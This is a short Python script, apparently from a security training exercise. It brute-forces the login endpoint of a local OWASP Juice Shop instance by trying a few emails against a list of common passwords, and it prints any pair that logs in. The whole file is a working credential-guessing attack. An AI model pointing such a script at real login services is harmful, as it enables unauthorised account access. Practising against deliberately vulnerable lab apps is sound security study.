import requests

emails=["admin@juice-sh.op", "test@gmail.com"]
passwords=["123456", "12345", "password", "iloveyou", "princess", "rockyou", "abc123", "admin123"]
url="http://localhost:3000/rest/user/login"

def bruteforce():
    for email in emails:
        for password in passwords:
            dane={"email":email, "password":password}
            req=requests.post(url=url, data=dane)
            if req.status_code==200:
                print(f'zalogowano uzywajac {email} i {password}')

if __name__=='__main__':
    bruteforce()